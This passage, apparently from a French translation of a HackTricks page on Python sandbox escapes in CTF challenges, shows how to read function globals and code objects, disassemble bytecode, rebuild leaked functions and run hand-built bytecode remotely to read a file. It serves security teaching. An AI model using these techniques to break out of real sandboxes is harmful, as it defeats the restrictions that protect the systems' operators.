{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Voir ici plus d'endroits pour obtenir les variables globales**](./#globals-and-locals)

### **Accéder au code de la fonction**

**`__code__`** et `func_code`: Vous pouvez **accéder** à cet **attribut** de la fonction pour **obtenir l'objet de code** de la fonction.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### Obtenir des informations sur le code

To bypass Python sandboxes, it is crucial to gather as much information as possible about the code running within the sandbox. This information can help identify potential vulnerabilities and weaknesses that can be exploited.

#### Static Analysis

Static analysis involves examining the code without executing it. This can be done using various tools and techniques, such as:

- **Code Review**: Manually reviewing the code to identify any security flaws or vulnerabilities.
- **Automated Scanners**: Using tools like `pylint` or `bandit` to scan the code for potential issues.
- **Dependency Analysis**: Checking for any known vulnerabilities in the dependencies used by the code.

#### Dynamic Analysis

Dynamic analysis involves executing the code within the sandbox and monitoring its behavior. This can be done using techniques like:

- **Code Instrumentation**: Modifying the code to log or track specific actions or variables.
- **Debugging**: Using a debugger to step through the code and observe its execution.
- **Dynamic Analysis Tools**: Utilizing tools like `strace` or `ltrace` to trace system calls or library calls made by the code.

By combining static and dynamic analysis techniques, you can gain a comprehensive understanding of the code's behavior and identify any potential weaknesses or vulnerabilities that can be exploited to bypass Python sandboxes.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **Désassembler une fonction**

To bypass Python sandboxes, it is often necessary to understand how the sandboxing mechanisms work. One way to do this is by disassembling the target function. Disassembling a function allows us to see the low-level instructions that make up the function's bytecode.

Python provides the `dis` module, which can be used to disassemble Python bytecode. By disassembling a function, we can analyze its instructions and understand how it operates.

Here is an example of how to disassemble a function using the `dis` module:

```python
import dis

def target_function():
    x = 10
    y = 20
    z = x + y
    print(z)

dis.dis(target_function)
```

The `dis.dis()` function takes a function object as an argument and prints the disassembled bytecode. Running the above code will output the disassembled instructions of the `target_function`.

By analyzing the disassembled bytecode, we can gain insights into how the function operates and potentially find vulnerabilities or ways to bypass the sandboxing mechanisms.

Keep in mind that disassembling a function is just one step in the process of bypassing Python sandboxes. It is important to have a deep understanding of Python bytecode and the sandboxing mechanisms in order to effectively bypass them.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox Python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et le **désassembler** localement. Vous ne verrez pas le contenu des variables chargées (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable chargée.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Compilation de Python

Maintenant, imaginons que vous puissiez d'une manière ou d'une autre **extraire les informations sur une fonction que vous ne pouvez pas exécuter**, mais que vous **avez besoin** d'exécuter.\
Comme dans l'exemple suivant, vous **pouvez accéder à l'objet code** de cette fonction, mais en lisant simplement le désassemblage, vous **ne savez pas comment calculer le drapeau** (_imaginez une fonction `calc_flag` plus complexe_).
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### Création de l'objet code

Tout d'abord, nous devons savoir **comment créer et exécuter un objet code** afin de pouvoir en créer un pour exécuter notre fonction leaked :
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
Selon la version de Python, les **paramètres** de `code_type` peuvent avoir un **ordre différent**. La meilleure façon de connaître l'ordre des paramètres dans la version de Python que vous utilisez est d'exécuter :
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### Recréation d'une fonction divulguée

{% hint style="warning" %}
Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction à partir de l'objet code de la fonction directement. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce dont **vous aurez besoin de divulguer**.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Contourner les défenses

Dans les exemples précédents au début de cet article, vous pouvez voir comment exécuter n'importe quel code Python en utilisant la fonction `compile`. C'est intéressant car vous pouvez exécuter des scripts entiers avec des boucles et tout en une seule ligne (et nous pourrions faire la même chose en utilisant `exec`).\
Quoi qu'il en soit, parfois il peut être utile de créer un objet compilé sur une machine locale et de l'exécuter sur la machine CTF (par exemple parce que nous n'avons pas la fonction `compile` dans la CTF).

Par exemple, compilons et exécutons manuellement une fonction qui lit _./poc.py_:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
Si vous ne pouvez pas accéder à `eval` ou `exec`, vous pouvez créer une **fonction appropriée**, mais l'appeler directement échouera généralement avec l'erreur : _constructeur non accessible en mode restreint_. Vous avez donc besoin d'une **fonction qui n'est pas dans l'environnement restreint pour appeler cette fonction**.
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Décompilation du code Python compilé

En utilisant des outils comme [**https://www.decompiler.com/**](https://www.decompiler.com), il est possible de **décompiler** du code Python compilé.

**Consultez ce tutoriel** :

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## Divers en Python

### Assert

Lorsque Python est exécuté avec des optimisations en utilisant le paramètre `-O`, les instructions assert et tout code conditionnel basé sur la valeur de **debug** seront supprimés.\
Par conséquent, les vérifications comme
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
seront contournées

## Références

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives et détecte les problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
